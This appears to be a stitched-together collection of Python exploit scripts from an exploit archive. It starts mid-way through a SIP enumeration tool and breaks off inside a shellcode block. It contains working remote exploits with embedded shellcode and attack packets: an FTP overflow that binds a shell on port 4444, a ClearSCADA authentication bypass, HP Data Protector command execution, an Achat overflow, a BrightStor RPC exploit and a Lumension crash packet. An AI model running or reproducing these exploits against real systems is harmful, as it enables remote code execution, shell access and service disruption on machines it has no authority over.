print printmsg("Sintaxe erro. Try %s --help" % sys.argv[0], "WARNING")
sys.exit(1)
else:
dsthost = options.ip
fromhost = options.source
if options.tag is None:
tag = random.getrandbits(22)
else:
tag = options.tag

buf = 1024
addr = (dsthost,dstport)
cid='%s' % str(random.getrandbits(32))
branch=None
srcaddr = (fromhost,5062)

# Create socket
UDPSock = socket(AF_INET,SOCK_DGRAM)
# Binding on 5060
UDPSock.bind(srcaddr)

# Send messages
method = "INVITE"
(header,branch) =
makeRequest(method,extension,dsthost,dsthost,dstport,cid,srcfake,branch,tag)
if(UDPSock.sendto(header, addr)):
sent = True
if options.debug is True:
print printmsg("Data Sent:", "WARNING")
print header
print printmsg("INVITE sent to %s!\n" % dsthost, "Green")
else:
sent = False

# Receive messages
while sent:
try:
UDPSock.settimeout(4)
data,bindaddr = UDPSock.recvfrom(buf)
if options.debug is True:
print printmsg("Data Received:", "WARNING")
print data
if re.search('SIP/2.0 180 Ringing', data):
packet = data.split('\n')
for packetline in packet:
for origin in re.finditer('o\=[a-zA-Z0-9\-]+\@[a-zA-Z0-9.\-]+', packetline):
print printmsg("o=<extension>@<server>: %s\n" % origin.group(0), "Blue")

method = 'CANCEL'
(header, branch) =
makeRequest(method,extension,dsthost,dsthost,dstport,cid,srcfake,branch,tag)
if options.debug is True:
print printmsg("Data Sent:", "WARNING")
print header
UDPSock.sendto(header, addr)
sent = False
except Exception as excpt:
print excpt
print printmsg("OPS... Timeout on receving data or something wrong with
socket... take a look at dest. port number too (-p option).", "WARNING")
sent = False

# Close socket
UDPSock.close()


#!/usr/bin/python
# Remote exploit for Easy File Sharing FTP server V2.0. The vulnerability
# was discovered by h07 and a POC for windows XP SP2 (polish version) was
# provided. This exploit was tested on windows 2000 server SP4. The exploit
# binds a shell on TCP port 4444.
#
# Author shall bear no responsibility for any screw ups
# Winny Thomas :-)

import os
import sys
import time
import struct
import socket

shellcode  = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
shellcode += "\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x48\x45\x34\x4e\x33\x4b\x38\x4e\x37"
shellcode += "\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x54\x4a\x31\x4b\x38"
shellcode += "\x4f\x45\x42\x32\x41\x30\x4b\x4e\x49\x34\x4b\x38\x46\x33\x4b\x38"
shellcode += "\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
shellcode += "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x43\x46\x35\x46\x32\x4a\x52\x45\x47\x45\x4e\x4b\x58"
shellcode += "\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x34"
shellcode += "\x4b\x38\x4f\x45\x4e\x51\x41\x50\x4b\x4e\x43\x30\x4e\x42\x4b\x48"
shellcode += "\x49\x38\x4e\x46\x46\x52\x4e\x31\x41\x36\x43\x4c\x41\x43\x4b\x4d"
shellcode += "\x46\x36\x4b\x48\x43\x34\x42\x53\x4b\x48\x42\x44\x4e\x50\x4b\x58"
shellcode += "\x42\x47\x4e\x31\x4d\x4a\x4b\x48\x42\x54\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x38\x50\x44\x50\x30\x4e\x4e\x42\x55\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x35\x48\x36\x4a\x36\x43\x43\x44\x43\x4a\x36\x47\x37\x43\x57"
shellcode += "\x44\x53\x4f\x35\x46\x45\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x43\x42\x45\x4f\x4f\x48\x4d\x4f\x45\x49\x48\x45\x4e"
shellcode += "\x48\x56\x41\x48\x4d\x4e\x4a\x30\x44\x30\x45\x55\x4c\x56\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x55"
shellcode += "\x4f\x4f\x48\x4d\x43\x45\x43\x45\x43\x45\x43\x35\x43\x35\x43\x44"
shellcode += "\x43\x55\x43\x44\x43\x35\x4f\x4f\x42\x4d\x48\x46\x4a\x56\x41\x31"
shellcode += "\x4e\x45\x48\x36\x43\x55\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x51\x42\x47\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x35\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x45\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x45\x4e\x49\x44\x48\x58\x49\x54\x47\x45\x4f\x4f\x48\x4d"
shellcode += "\x42\x35\x46\x45\x46\x55\x45\x45\x4f\x4f\x42\x4d\x43\x59\x4a\x56"
shellcode += "\x47\x4e\x49\x37\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x55"
shellcode += "\x4f\x4f\x42\x4d\x48\x56\x4c\x46\x46\x46\x48\x46\x4a\x36\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x46\x42\x35\x49\x35\x49\x32\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x36\x46\x34\x49\x38\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x52\x50\x4f\x44\x44\x4e\x32"
shellcode += "\x43\x59\x4d\x38\x4c\x57\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46"
shellcode += "\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x47\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x35\x47\x45\x44\x55\x41\x45\x41\x45\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x45\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x46"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x46"
shellcode += "\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x48\x47\x55\x4e\x4f"
shellcode += "\x43\x58\x46\x4c\x46\x56\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
shellcode += "\x4a\x56\x4f\x4e\x50\x4c\x42\x4e\x42\x36\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a"

def ConnectRemoteShell(target):
       connect = "/usr/bin/telnet " + target + " 4444"
       os.system(connect)

def ExploitFTP(target):
       sockAddr = (target, 21)
       tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       tsock.connect(sockAddr)
       response = tsock.recv(1024)
       print response

       # At the time of overflow EBX points into our shellcode
       payload = 'A' * 2553
       # NOP's pad with a 15 byte jump over some junk and the RET address
       # Jumps into our shellcode
       payload += '\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x0f'
       # Address of 'call ebx' from kernel32.dll SP4
       payload += struct.pack('<L', 0x7C577B03)
       # Address of pop reg/pop reg/ret for XP SP2 from ws2_32.dll
       # But this one is not very reliable like Win2K SP4
       #payload += struct.pack('<L', 0x71AB1269)
       payload += '\x90' * 83
       payload += shellcode

       user = 'USER anonymous\r\n'
       tsock.send(user)
       response = tsock.recv(1024)
       print response

       passwd = 'PASS \x2c' + payload + '\r\n'
       tsock.send(passwd)
       response = tsock.recv(1024)
       print response

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target>' % sys.argv[0]
               sys.exit(-1)

       ExploitFTP(target)

# milw0rm.com [2007-03-26]
source: http://www.securityfocus.com/bid/47952/info

Lumension Security Lumension Device Control (formerly Sanctuary) is prone to a memory-corruption vulnerability.

An attacker can exploit this issue to cause a denial-of-service condition. Due to the nature of this issue, remote code execution is possible but has not been confirmed.

Lumension Device Control 4.4 SR6 is vulnerable; other versions may also be affected. 

#!/usr/local/bin/python

import sys
from socket import *
import os

if (len(sys.argv)!=2):
	print "\n--------------------------------------------------"
	print "Usage: %s <target IP>" % sys.argv[0]
	print "--------------------------------------------------\n"
	exit(0)

host=sys.argv[1]
port=65129

packet1 =  "\xec\x02\x00\x00"	#length of remaining packet
packet1 += "\xc9\x00\x00\x00"	#some kind of packet ID?
#packet1 += "\x18\x00\x00\x00"
packet1 += "\x61\x61\x61\x61"	#crash occurs here

packet1 += "\xc8\x02\x00\x00\xd4\xf8\x27\xe3\x51\xdf\xc9\x48\x82\xc3"
packet1 += "\xdb\x73\xbf\x42\xce\x77\xec\x00\x00\x00\x00\x00\x00\x00\x01\x00"
packet1 += "\x00\x00\x0d\xd8\x91\x32\x61\xf4\x43\xa1\xe1\x8e\x27\x68\x6d\xde"
packet1 += "\xbe\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x95\x00\x05\x01"
packet1 += "\x03\x00\x00\x03\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00"
packet1 += "\x34\x2e\x34\x2e\x31\x34\x35\x32" #client version
packet1 += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
packet1 += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd6\x5e"
packet1 += "\xe0\x81\xdb\xd8\xcb\x01\xe4\x95\x45\xe1\xdb\xd8\xcb\x01\x7c\x99"
packet1 += "\x47\xbc\xdb\xd8\xcb\x01\xd6\xbc\xb0\x34\xdc\xd8\xcb\x01\x02\x00"
packet1 += "\x00\x00\x9c\x47\x57\x00\xd4\xf8\x27\xe3\x51\xdf\xc9\x48\x82\xc3"
packet1 += "\xdb\x73\xbf\x42\xce\x77\xec\x00\x00\x00\x00\x00\x00\x00\x00\x00"
packet1 += "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
packet1 += "\xc0\xa8\x00\x6b" #client IP address
packet1 += "\xff\xff\xff\x00" #client subnet mask
packet1 += "\x61\x00\x63\x00\x65\x00\x72\x00\x2d\x00\x65\x00\x38\x00"
packet1 += "\x31\x00\x37\x00\x66\x00\x61\x00\x65\x00\x30\x00\x64\x00\x38\x00" # client hostname
packet1 += "\x00" * 480
packet1 += "\x00\x00\x40\xfc\xba\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80"
packet1 += "\x85\xcc\x23\x00\x00\x00\x80\xee\x36\x00\x93\x84\xde\x84\x02\x00"
packet1 += "\x00\x00\x00\x00\x00\x00"

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
s.send(packet1)
print s.recv(1024)
s.close()

#!/usr/bin/python
# cs-auby.py
# ClearSCADA Remote Authentication Bypass Exploit
#
# Jeremy Brown
# [jbrown3264/gmail]
#
# Oct 2010 (released Jan 2015)
#
# There is an authentication bypass vulnerability in ClearSCADA that can be
# exploited by triggering an exception in dbserver.exe and taking advantage
# of the way the program handles it.
#
# When an exception in occurs, ClearSCADA enters "Safe Mode". This exposes
# it's diagnostic functions to remote users without requiring a valid login
# as it would normally. A remote attacker could view senstive information
# and possibly modify functions of the server running on the affected host.
#
# This code triggers an exception in dbserver.exe and checks to see if you
# can then access the diagnostic page without authentication.
#
# Tested on ClearSCADA 2010R1 running on Windows
#
# Fix information: http://ics-cert.us-cert.gov/advisories/ICSA-11-173-01
#

import sys
import socket
import httplib
import urllib
from time import sleep

pkt_1=(
"\xfb\x0e\x45\x06\x0e\x00\x00\x00\x18\x00\x00\x00"
"\x49\x00\x50\x00\x20\x00\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00"
"\x2e\x00\x30\x00\x2e\x00\x31\x00\x2c\x00\x20\x00\x53\x00\x65\x00"
"\x73\x00\x73\x00\x69\x00\x6f\x00\x6e\x00\x20\x00\x30\x00\x00\x00"
"\x08\x00\x00\x00"
)

pkt_2=(
"\x00\x00\x00\x00"
"\x26\x00\x00\x00"
"\x08\x00\x00\x00\x0f\x00\x00\x00\x43\x00\x72\x00\x79\x00\x73\x00"
"\x74\x00\x61\x00\x6c\x00\x52\x00\x65\x00\x70\x00\x6f\x00\x72\x00"
"\x74\x00\x73\x00\x00\x00"
)

pkt_3=( # "Exception Occured"
"\x00\x00\x00\x00\xd7\x01\x00\x00\x34\x00\x00\x00\x0d\x00\x00\x00"
"\x09\x00\x00\x00\x43\x00\x50\x00\x72\x00\x6f\x00\x66\x00\x69\x00"
"\x6c\x00\x65\x00\x00\x00\x0e\x00\x00\x00\x43\x00\x50\x00\x72\x00"
"\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x46\x00\x6c\x00\x6f\x00"
"\x61\x00\x74\x00\x00\x00\x0e\x00\x00\x00\x43\x00\x50\x00\x72\x00"
"\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x55\x00\x4c\x00\x6f\x00"
"\x6e\x00\x67\x00\x00\x00\x0d\x00\x00\x00\x43\x00\x50\x00\x72\x00"
"\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x4c\x00\x6f\x00\x6e\x00"
"\x67\x00\x00\x00\x10\x00\x00\x00\x43\x00\x41\x00\x64\x00\xBB\x00" # last w0rd
"\x00\x42\x00\x49\x00\x54\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65"
"\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41"
"\x00\x64\x00\x76\x00\x42\x00\x59\x00\x54\x00\x45\x00\x56\x00\x61"
"\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x11"
"\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x57\x00\x4f\x00\x52"
"\x00\x44\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61"
"\x00\x70\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76"
"\x00\x44\x00\x49\x00\x4e\x00\x54\x00\x56\x00\x61\x00\x6c\x00\x75"
"\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x12\x00\x00\x00\x43"
"\x00\x41\x00\x64\x00\x76\x00\x55\x00\x44\x00\x49\x00\x4e\x00\x54"
"\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70"
"\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x52"
"\x00\x45\x00\x41\x00\x4c\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65"
"\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x13\x00\x00\x00\x43\x00\x41"
"\x00\x64\x00\x76\x00\x44\x00\x4f\x00\x55\x00\x42\x00\x4c\x00\x45"
"\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70"
"\x00\x00\x00\x13\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x53"
"\x00\x74\x00\x72\x00\x69\x00\x6e\x00\x67\x00\x56\x00\x61\x00\x6c"
"\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x0f\x00\x00"
"\x00\x43\x00\x43\x00\x72\x00\x79\x00\x73\x00\x74\x00\x61\x00\x6c"
"\x00\x52\x00\x65\x00\x70\x00\x6f\x00\x72\x00\x74\x00\x00\x00\x00"
)

port=5481
s_port=443


def do_ssl(target,port):
    try:
        conn = httplib.HTTPSConnection(target,port)
        conn._http_vsn = 10
        conn._http_vsn_str = "HTTP/1.0"

        conn.request("GET","/diag/Info")

        resp = conn.getresponse()
        conn.close()
        
    except Exception, error:
        print("Error: %s" % error)
        return None
        
    return resp


def main():
    
    if len(sys.argv)!=2:
         print("Usage: %s <target>" % sys.argv[0])
         sys.exit(0)

    target=sys.argv[1]
    cs=target,port

    print "Checking server status..."

    resp = do_ssl(target,s_port)
    
    if(resp == None):
        return
    
    if(resp.status==301):
        print "Server status is normal.\n"

    elif(resp.status==200):
        print "Server is already in safe mode."
        sys.exit(1)

    elif((resp.status!=301)|(resp.status!=200)):
        print("Server returned %d %s, server state unknown.\nContinuing anyways..\n" % (resp.status,resp.reason))
    
    print("Sending packets to trigger exception...\n")
    
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect(cs)

        sock.send(pkt_1)
        resp_1 = sock.recv(32)

        sock.send(pkt_2)
        resp_2 = sock.recv(32)

        sock.send(pkt_3)
        resp_3 = sock.recv(32)

        sock.close()
        
    except Exception, error:
        print("Error: %s" % error)
        return None

    print("Finished, checking server status again...")

    sleep(1)

    resp = do_ssl(target,s_port)
    
    if(resp == None):
        return
    
    if(resp.status==301):
         print("Server status is still normal, maybe it's patched..\n")

    elif(resp.status==200):
         print("Server entered \"safe\" mode :)\n")
         print("Surf on over to https://%s:443/diag/Info to explore" % target)

    elif((resp.status!=301)|(resp.status!=200)):
         print("Server returned %d %s, server state unknown." % (resp.status,resp.reason))


if __name__ == "__main__":
    main()
#!/usr/bin/python

# Exploit Title: HP-Data-Protector-8.x Remote command execution.
# Google Dork: -
# Date: 30/01/2015
# Exploit Author: Juttikhun Khamchaiyaphum
# Vendor Homepage: https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04373818
# Software Link: http://www8.hp.com/th/en/software-solutions/data-protector-backup-recovery-software/
# Version: 8.x
# Tested on: IA64 HP Server Rx3600
# CVE : CVE-2014-2623
# Usage: hp_data_protector_8_x.py <target ip> <port> <command e.g. "uname -m">"

import socket
import struct
import sys

def exploit(host, port, command):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        print "[+] Target connected."

        OFFSET_DEC_START = 133
        OFFSET_DEC = (OFFSET_DEC_START + len(command))
        # print "OFFSET_DEC_START:" + str(OFFSET_DEC_START)
        # print "len(command)" + str(len(command))
        # print "OFFSET_DEC" + str(OFFSET_DEC)
        OFFSET_HEX = "%x" % OFFSET_DEC
        # print "OFFSET_HEX" + str(OFFSET_HEX)
        OFFSET_USE = chr(OFFSET_DEC)
        # print "Command Length: " + str(len(command))
        PACKET_DATA = "\x00\x00\x00"+\
        OFFSET_USE+\
        "\x20\x32\x00\x20\x73\x73\x73\x73\x73\x73\x00\x20\x30" + \
        "\x00\x20\x54\x45\x53\x54\x45\x52\x00\x20\x74\x65\x73\x74\x65\x72\x00" + \
        "\x20\x43\x00\x20\x32\x30\x00\x20\x74\x65\x73\x65\x72\x74\x65\x73\x74" + \
        "\x2E\x65\x78\x65\x00\x20\x72\x65\x73\x65\x61\x72\x63\x68\x00\x20\x2F" + \
        "\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x00\x20\x2F\x64\x65\x76\x2F\x6E\x75" + \
        "\x6C\x6C\x00\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x00\x20\x30\x00" + \
        "\x20\x32\x00\x20\x75\x74\x69\x6C\x6E\x73\x2F\x64\x65\x74\x61\x63\x68" + \
        "\x00\x20\x2D\x64\x69\x72\x20\x2F\x62\x69\x6E\x20\x2D\x63\x6F\x6D\x20" + \
        " %s\x00" %command

        # Send payload to target
        print "[+] Sending PACKET_DATA"
        sock.sendall(PACKET_DATA)

        # Parse the response back
        print "[*] Result:"
        while True:
            response = sock.recv(2048)
            if not response: break
            print response

    except Exception as ex:
        print >> sys.stderr, "[-] Socket error: \n\t%s" % ex
        exit(-3)
    sock.close()

if __name__ == "__main__":
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
        command = sys.argv[3]
        exploit(target, port, command)
    except IndexError:
         print("Usage: hp_data_protector_8_x.py <target ip> <port> <command e.g. \"uname -m\">")
    exit(0)#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
buf += "\x30\x52\x7a\x6c\x74\x4b\x70\x52\x4e\x34\x64\x4b\x63"
buf += "\x42\x4f\x38\x4a\x6f\x38\x37\x6d\x7a\x4d\x56\x4d\x61"
buf += "\x49\x6f\x74\x6c\x4f\x4c\x6f\x71\x33\x4c\x69\x72\x4e"
buf += "\x4c\x4f\x30\x66\x61\x58\x4f\x5a\x6d\x59\x71\x67\x57"
buf += "\x68\x62\x48\x72\x52\x32\x50\x57\x54\x4b\x72\x32\x4e"
buf += "\x30\x64\x4b\x6e\x6a\x4d\x6c\x72\x6b\x70\x4c\x4a\x71"
buf += "\x43\x48\x39\x53\x71\x38\x6a\x61\x36\x71\x4f\x61\x62"
buf += "\x6b\x42\x39\x4f\x30\x4a\x61\x38\x53\x62\x6b\x30\x49"
buf += "\x6b\x68\x58\x63\x4e\x5a\x6e\x69\x44\x4b\x6f\x44\x72"
buf += "\x6b\x4b\x51\x36\x76\x70\x31\x69\x6f\x46\x4c\x57\x51"
buf += "\x48\x4f\x4c\x4d\x6a\x61\x55\x77\x4f\x48\x57\x70\x54"
buf += "\x35\x49\x66\x49\x73\x51\x6d\x7a\x58\x6d\x6b\x53\x4d"
buf += "\x4e\x44\x34\x35\x38\x64\x62\x38\x62\x6b\x52\x38\x6b"
buf += "\x74\x69\x71\x4a\x33\x33\x36\x54\x4b\x7a\x6c\x6e\x6b"
buf += "\x72\x6b\x51\x48\x6d\x4c\x6b\x51\x67\x63\x52\x6b\x49"
buf += "\x74\x72\x6b\x4d\x31\x7a\x30\x44\x49\x51\x34\x6e\x44"
buf += "\x4b\x74\x61\x4b\x51\x4b\x4f\x71\x51\x49\x71\x4a\x52"
buf += "\x31\x49\x6f\x69\x50\x31\x4f\x51\x4f\x6e\x7a\x34\x4b"
buf += "\x6a\x72\x38\x6b\x44\x4d\x71\x4d\x50\x6a\x59\x71\x64"
buf += "\x4d\x35\x35\x65\x62\x4b\x50\x49\x70\x4b\x50\x52\x30"
buf += "\x32\x48\x6c\x71\x64\x4b\x72\x4f\x51\x77\x59\x6f\x79"
buf += "\x45\x45\x6b\x48\x70\x75\x65\x35\x52\x30\x56\x72\x48"
buf += "\x33\x76\x35\x45\x37\x4d\x63\x6d\x49\x6f\x37\x65\x6d"
buf += "\x6c\x6a\x66\x31\x6c\x79\x7a\x51\x70\x4b\x4b\x67\x70"
buf += "\x53\x45\x6d\x35\x55\x6b\x31\x37\x4e\x33\x32\x52\x30"
buf += "\x6f\x42\x4a\x6d\x30\x50\x53\x79\x6f\x37\x65\x70\x63"
buf += "\x53\x31\x72\x4c\x30\x63\x4c\x6e\x70\x65\x32\x58\x50"
buf += "\x65\x6d\x30\x41\x41"


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('192.168.91.130', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
#!/usr/bin/python
#
# Computer Associates (CA) Brightstor Backup Mediasvr.exe Remote Code Exploit
# (Previously Unknown)
#
# There seems to be an design error in the handling of RPC data with xdr procedures
# across several .dll's imported by Mediasvr.exe. Four bytes from an RPC packet are
# processed as a particular address (xdr_handle_t data which is run through multiple bit
# shifts, and reversing of bytes), and eventually loaded into ECX.
#
# The 191 (0xbf) procedure, followed by nulls (at least 8 bytes of nulls, which may
# be Null Credentials and Auth?) leads to an exploitable condition.
#
# .text:0040AACD 008                 mov     ecx, [esp+8]
# .text:0040AAD1 008                 mov     dword_418820, esi
# .text:0040AAD7 008                 push    offset dword_418820
# .text:0040AADC 00C                 mov     eax, [ecx]
# .text:0040AADE 00C                 call    dword ptr [eax+2Ch]
#
# At this point, you have control of ECX (esp+8 is your address data). The data from the packet
# is stored in memory and is relatively static (see NOTE).
#
# The address is then loaded into EAX, and then called as EAX+2Ch, which is
# controllable data from the packet. In this code, I just jump ahead to
# the portbinding shellcode.
#
# NOTE: The only issue I have found is when the system is rebooted, the packet data
# appears at a higher memory location when Mediasvr.exe crashes
# and is restarted. I have accounted for this in the code, when the port that
# Mediasvr.exe is listening on is below TCP port 1100, which is usually only after
# a reboot
#
# This was tested on BrightStor ARCserve Backup 11.5.2.0 (SP2) with the latest
# CA patches on Windows XP SP2 (I believe there is some issue with SP1, which
# is more then likely the memory locations)
#
# The patches include the following updates to Mediasvr.exe
# http://supportconnectw.ca.com/public/storage/infodocs/babimpsec-notice.asp
#
# CA has been notified
#
# Author: M. Shirk
# Tester: Tebodell
#
# (c) Copyright 2007 (Shirkdog Security) shirkdog_list $ at % hotmail dot com
#
# Use at your own Risk: You have been warned
#------------------------------------------------------------------------

import os
import sys
import time
import socket
import struct

#------------------------------------------------------------------------

#Portbind shellcode; Binds shell on TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
